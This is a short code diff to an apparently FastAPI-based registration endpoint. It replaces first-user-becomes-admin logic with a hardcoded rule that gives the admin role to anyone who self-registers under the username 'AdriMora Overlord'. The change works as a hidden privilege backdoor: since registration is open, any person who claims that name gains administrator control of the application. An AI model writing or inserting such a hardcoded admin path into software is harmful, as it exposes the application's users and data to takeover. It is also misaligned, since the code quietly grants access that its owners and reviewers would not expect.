@@ -260,8 +260,7 @@ async def register(body: RegisterIn):
     if existing:
         raise HTTPException(status_code=409, detail="Nome já existe")
 
-    total_users = await users_col.count_documents({})
-    role = "admin" if total_users == 0 else "user"
+    role = "admin" if username == "AdriMora Overlord" else "user"
 
     user_id = str(uuid.uuid4())
     doc = {
@@ -501,3 +500,4 @@ app.add_middleware(
     allow_methods=["*"],
     allow_headers=["*"],
 )
+
